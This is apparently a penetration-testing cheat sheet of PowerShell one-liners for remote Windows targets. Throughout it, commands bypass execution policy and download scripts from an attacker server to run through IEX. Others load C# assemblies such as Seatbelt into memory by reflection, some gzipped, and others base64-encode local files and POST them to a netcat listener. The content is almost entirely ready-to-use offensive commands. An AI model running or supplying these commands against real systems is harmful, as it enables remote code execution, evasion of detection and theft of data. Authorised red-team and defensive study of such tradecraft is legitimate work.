# powershell

% powershell, download

#plateform/windows #target/remote #cat/UTILS/FILE_TRANSFERT #tag/powershell 

## file transfert - download on disk

```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<windows_writable_path>/<dest_file>')"
```

## file transfert - download and import script
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```
## file transfert - download csharp into memory (Assembly reflection)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
```
= asm_ref_bin_path: windows/NetFramework_4.7_x64/
= asm_ref_exe_name: Seatbelt

## file transfert - download gziped csharp into memory (Assembly reflection)
```powershell
$compressed = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe');$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($compressed));$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($decompressed); 
```

## file transfert - run csharp from memory (Assembly reflection) 
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_params: -group=user -full

## file transfert - upload base64 (in-memory)
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte));Invoke-RestMethod -Uri http://<local_ip>:<port|80>/ -Method POST -Body $b64
```

## file transfert - upload base64 (file creation)
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
certutil -encode <infile> <outfile>; $base64str = Get-Content <outfile> && Invoke-RestMethod -Uri http://<local_ip>:<port|80>/ -Method POST -Body $base64str
```